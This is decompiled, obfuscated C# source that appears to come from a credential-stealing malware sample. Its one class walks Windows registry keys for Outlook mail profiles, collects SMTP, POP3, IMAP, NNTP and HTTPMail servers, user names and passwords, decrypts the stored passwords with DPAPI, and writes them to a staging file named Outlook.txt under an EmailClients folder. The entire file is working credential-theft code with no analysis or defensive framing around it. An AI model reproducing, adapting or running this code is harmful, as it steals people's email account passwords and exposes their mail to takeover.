using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

// Token: 0x02000049 RID: 73
internal class Class15
{
	// Token: 0x0600020B RID: 523 RVA: 0x000104B8 File Offset: 0x0000E6B8
	public static void smethod_0(string string_1)
	{
		string str = "";
		string[] array = new string[]
		{
			"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
			"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
			"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
			"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
		};
		string[] string_2 = new string[]
		{
			"SMTP Email Address",
			"SMTP Server",
			"POP3 Server",
			"POP3 User Name",
			"SMTP User Name",
			"NNTP Email Address",
			"NNTP User Name",
			"NNTP Server",
			"IMAP Server",
			"IMAP User Name",
			"Email",
			"HTTP User",
			"HTTP Server URL",
			"POP3 User",
			"IMAP User",
			"HTTPMail User Name",
			"HTTPMail Server",
			"SMTP User",
			"POP3 Password2",
			"IMAP Password2",
			"NNTP Password2",
			"HTTPMail Password2",
			"SMTP Password2",
			"POP3 Password",
			"IMAP Password",
			"NNTP Password",
			"HTTPMail Password",
			"SMTP Password"
		};
		foreach (string string_3 in array)
		{
			str += Class15.smethod_1(string_3, string_2);
		}
		try
		{
			Directory.CreateDirectory(string_1 + Class15.string_0);
			File.WriteAllText(string_1 + Class15.string_0 + "\\Outlook.txt", str + "\r\n");
		}
		catch
		{
		}
	}

	// Token: 0x0600020C RID: 524 RVA: 0x00010660 File Offset: 0x0000E860
	private static string smethod_1(string string_1, string[] string_2)
	{
		Regex regex = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
		Regex regex2 = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
		string text = "";
		try
		{
			foreach (string text2 in string_2)
			{
				try
				{
					object obj = Class15.smethod_2(string_1, text2);
					if (obj != null && text2.Contains("Password") && !text2.Contains("2"))
					{
						text = string.Concat(new string[]
						{
							text,
							text2,
							": ",
							Class15.smethod_3((byte[])obj),
							"\r\n"
						});
					}
					else if (regex.IsMatch(obj.ToString()) || regex2.IsMatch(obj.ToString()))
					{
						text += string.Format("{0}: {1}\r\n", text2, obj);
					}
					else
					{
						text = string.Concat(new string[]
						{
							text,
							text2,
							": ",
							Encoding.UTF8.GetString((byte[])obj).Replace(Convert.ToChar(0).ToString(), ""),
							"\r\n"
						});
					}
				}
				catch
				{
				}
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_1, false);
			string[] subKeyNames = registryKey.GetSubKeyNames();
			foreach (string str in subKeyNames)
			{
				text += Class15.smethod_1(string_1 + "\\" + str, string_2);
			}
		}
		catch
		{
		}
		return text;
	}

	// Token: 0x0600020D RID: 525 RVA: 0x00010830 File Offset: 0x0000EA30
	public static object smethod_2(string string_1, string string_2)
	{
		object result = null;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_1, false);
			result = registryKey.GetValue(string_2);
			registryKey.Close();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x0600020E RID: 526 RVA: 0x00010874 File Offset: 0x0000EA74
	public static string smethod_3(byte[] byte_0)
	{
		try
		{
			byte[] array = new byte[byte_0.Length - 1];
			Buffer.BlockCopy(byte_0, 1, array, 0, byte_0.Length - 1);
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
		}
		catch
		{
		}
		return "null";
	}

	// Token: 0x0600020F RID: 527 RVA: 0x0000446C File Offset: 0x0000266C
	public Class15()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000210 RID: 528 RVA: 0x00005123 File Offset: 0x00003323
	// Note: this type is marked as 'beforefieldinit'.
	static Class15()
	{
		Class40.gcO0h7LzslQIW();
		Class15.string_0 = "\\EmailClients\\Outlook";
	}

	// Token: 0x040000F2 RID: 242
	public static string string_0;
}
